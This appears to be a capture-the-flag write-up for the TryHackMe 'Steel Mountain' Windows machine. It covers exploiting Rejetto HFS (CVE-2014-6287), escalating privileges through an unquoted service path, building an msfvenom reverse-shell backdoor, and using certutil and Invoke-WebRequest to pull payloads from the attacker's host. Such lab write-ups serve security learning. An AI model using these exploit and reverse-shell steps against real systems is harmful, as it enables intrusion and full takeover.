@@ -1,0 +1,239 @@
+I"i?<p><a href="https://tryhackme.com/room/steelmountain"><strong>Solve Yourself »</strong></a></p>
+
+<p>The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
+vulnerabilities that occur on the system.</p>
+
+<h1 id="first-method">FIRST METHOD</h1>
+<h2 id="1-preperation">1-Preperation</h2>
+<p>Export the ip address of the machine as a variable for shorthand usage.
+<br />-&gt; export ip={MACHINE IP}
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg" alt="" class="normal" /></p>
+
+<h2 id="2-enumeration">2-Enumeration</h2>
+<p>Let us run Network Mapper (<strong>nmap</strong>) to discover opened ports and services.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Probe open ports to determine service/version info</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">SYN, half TCP scan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-O</td>
+      <td style="text-align: left">Enable OS detection</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T4</td>
+      <td style="text-align: left">T{0-5} Set scan speed, higher is faster</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Scan all 65536 ports</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Skip host discovery</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-oN</td>
+      <td style="text-align: left">Write output to a file</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="o">{</span>machine IP<span class="o">}</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> <span class="o">{</span>outputfile<span class="o">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg" alt="" class="normal" /><br /><br />
+There is a web server running on port <strong>80</strong>, let us visit.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg" alt="" class="normal" /><br /><br />
+There is also one more web server is running at port <strong>8080</strong>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg" alt="" class="normal" /><br /><br />
+If you click on the <strong>HttpFileServer2.3</strong> link under the <strong>Server Information</strong> heading, it will redirect you to the following page.
+It seems the HTTP server is being run by <strong>rejetto</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg" alt="" class="normal" /><br /><br />
+There is a vulnerablity on the <strong>Rejetto HFS versions 2.3, 2.3a, and 2.3b</strong>, let’s check.<br />
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287"><strong>CVE-Database -&gt; Rejetto HFS 2.3</strong></a>
+<br /><a href="https://www.kb.cert.org/vuls/id/251276"><strong>More detailed explaination</strong></a>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg" alt="" class="normal" /><br /><br /></p>
+
+<h2 id="3-exploitation">3-Exploitation</h2>
+
+<h3 id="gaining-access-to-the-system---getting-user-flag">Gaining Access to the System - Getting User Flag</h3>
+<p>Launch up your <strong>msfconsole</strong> and do a search for <strong>CVE-2014-6287</strong> to see if there is any exploit that we can use.
+There is one with an excellent rank, awesome! Let us use it.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg" alt="" class="normal" /><br /><br />
+Copy the THM IP with that command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ifconfig | <span class="nb">grep</span> <span class="nt">-C</span> 1 tun0 | <span class="nb">tail</span> <span class="nt">-n</span> 1 | <span class="nb">awk</span> <span class="s1">'{print $2}'</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg" alt="" class="normal" /><br /><br />
+-&gt; set RPORT <strong>8080</strong><br />-&gt; set RHOST <strong>machine IP</strong><br />-&gt; set LHOST <strong>your THM IP</strong><br />-&gt; exploit</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">RPORT</td>
+      <td style="text-align: left">The target port (TCP)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">RHOST</td>
+      <td style="text-align: left">Address of the target</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">LPORT</td>
+      <td style="text-align: left">The listen port</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg" alt="" class="normal" /><br /><br />
+After receiving meterpreter session, run <strong>shell</strong> to get an interactive shell.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg" alt="" class="normal" /><br /><br />
+Find the flag under <strong>C:\users\bill\Desktop</strong> directory.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg" alt="" class="normal" /><br /><br /></p>
+
+<h3 id="escalate-the-privileges---getting-the-root-flag">Escalate the privileges - Getting the Root flag</h3>
+
+<p>After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
+permissions against the system. <strong>PowerUp.ps1</strong> is a program that facilitates fast checks in a windows machine to identify 
+any misconfigurations and privilege escalation possibilities.
+<br />-&gt; <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>Download PowerUp.ps1</strong></a>
+<br />-&gt; <a href="https://github.com/PowerShellMafia/PowerSploit"><strong>PowerSploit GitHub Repo</strong></a>
+<br />-&gt; Run <strong>exit</strong> and get back to the <strong>meterpreter</strong> session.
+<br />-&gt; Upload the script just as we did before to the machine.
+<br />-&gt; Run <strong>load powershell</strong>
+<br />-&gt; Run <strong>powershell_shell</strong>
+<br />You will get <strong>PowerShell</strong> this time instead of a regular <strong>cmd prompt</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg" alt="" class="normal" /><br /><br />
+<br />-&gt; Run <strong>. .\PowerUp.ps1</strong>
+<br />-&gt; Run <strong>Invoke-AllChecks</strong>
+<br /><strong>InvokeAllChecks</strong> will diagnose any detectable vulnerabilities along with their descriptions.
+<br /><br />The first result we got is a service called <strong>AdvancedSystemCare9</strong>, and it has a vulnerability called 
+<strong>Unquoted Service Path</strong> <a href="https://krygennn.github.io/posts/unquoted-service-path-vulnerability/"><strong>-&gt; Read more about it</strong></a>. We will abuse this vulnerability. 
+<br /><strong>CanRestart</strong> field means that the current user, in this case, <strong>bill</strong>, can manually restart the service even though
+the service itself is being run with <strong>LocalSystem</strong> service account permissions, which has the top-level privileges.
+<br /><a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN"><strong>LocalSystem Service Account</strong></a>
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Launch up <strong>msfvenom</strong> to deploy a reverse shell binary.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">LHOST</td>
+      <td style="text-align: left">The IP address that the reverse shell will connect</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">LPORT</td>
+      <td style="text-align: left">The port that the reverse shell will connect</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p</td>
+      <td style="text-align: left">Payload to use</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-o</td>
+      <td style="text-align: left">Name of the file</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-f</td>
+      <td style="text-align: left">File type of the output binary</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">={</span>THM IP<span class="o">}</span> <span class="nv">LPORT</span><span class="o">={</span>RANDOM FREE PORT<span class="o">}</span> <span class="nt">-f</span> exe <span class="nt">-o</span> <span class="o">{</span>somename<span class="o">}</span>.exe</code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Upload the binary to the target machine.
+<br />-&gt; Get the <strong>shell</strong> again.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Relocate the binary into <strong>C:\Program Files (x86)\IObit</strong> directory.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>-&gt; Rename the binary to <strong>Advanced.exe</strong>.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Start a <strong>netcat</strong> listener on your machine with the port that is defined when creating
+the backdoor.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">nc</span><span class="w"> </span><span class="nt">-nvlp</span><span class="w"> </span><span class="p">{</span><span class="n">SPECIFIED</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>After starting a netcat session, restart the service</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<p><br />When the service boots, <strong>Advanced.exe</strong> backdoor binary will be executed instead of the <strong>ASCService.exe</strong>. 
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg" alt="" class="normal" /><br /><br />
+You can find the root flag <strong>root.txt</strong> under <strong>C:\Users\Administrator\Desktop</strong> directory.</p>
+
+<h1 id="second-method">SECOND METHOD</h1>
+
+<p>In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.</p>
+
+<h2 id="1-preperation-1">1-Preperation</h2>
+<p><br />-&gt; Copy <strong>Advanced.exe</strong> or create a new backdoor executable with <strong>msfvenom</strong> just like before.
+<br />-&gt; Download <a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat"><strong>winPEAS.bat</strong></a>
+<br />-&gt; Download static binary <a href="https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe"><strong>nc.exe</strong></a>
+<br />-&gt; Download <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>PowerUp.ps1</strong></a> or use the previous one if you downloaded it before.
+<br />-&gt; Download <a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py"><strong>CVE-2014-6287.py</strong></a> or from <a href="https://www.exploit-db.com/exploits/39161"><strong>Exploitdb</strong></a>
+<br /><br />Your directory should look like this
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg" alt="" class="normal" /><br /><br /></p>
+<h2 id="2-exploitation">2-Exploitation</h2>
+<p>Edit the <strong>cve20146287.py</strong> file, set the <strong>ip_addr</strong> field to your THM IP, and set the <strong>local_port</strong> to any free port.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/25.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>Start a <strong>netcat</strong> listener on the port you declared in the <strong>python</strong> file.
+<br />Run it twice. At first run the server will download <strong>nc.exe</strong> static binary from your server. At second, it will run
+<strong>nc.exe</strong> to connect to your local machine by providing a CMD prompt.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/21.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p><br />It is possible to use PowerUp.ps1 again or <strong>winPEAS.bat</strong> can be used to enumerate misconfigurations.
+<br />You can download any file from the running python server by using one of these utilites.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest -URI {YOUR SERVER IP(THM IP)}:80/{THE FILE YOU WANT TO DOWNLOAD} -OutFile {THE PATH WHERE THE FILE WILL BE SAVED}"</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">http://</span><span class="p">{</span><span class="n">YOUR</span><span class="w"> </span><span class="nx">SERVER</span><span class="w"> </span><span class="nx">IP</span><span class="p">(</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">)}:</span><span class="mi">80</span><span class="n">/</span><span class="p">{</span><span class="n">THE</span><span class="w"> </span><span class="nx">FILE</span><span class="w"> </span><span class="nx">YOU</span><span class="w"> </span><span class="nx">WANT</span><span class="w"> </span><span class="nx">TO</span><span class="w"> </span><span class="nx">DOWNLOAD</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/22.jpg" alt="" class="normal" /><br /><br />
+As it can be seen from the output, this time, winPEAS provided the information about the vulnerability on <strong>Advanced System Care9</strong>
+service and many others.
+<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/23.jpg" alt="" class="normal" /><br /><br />
+You will need to repeat previous steps to get the root flag. Download <strong>Advanced.exe</strong> with <br /><strong>Invoke-WebRequest</strong> or
+<strong>certutil</strong>, start a Netcat listener and restart the service.
+<br />
+<br />
+Thank you for following, wish you more penetrations ;)</p>
+:ET
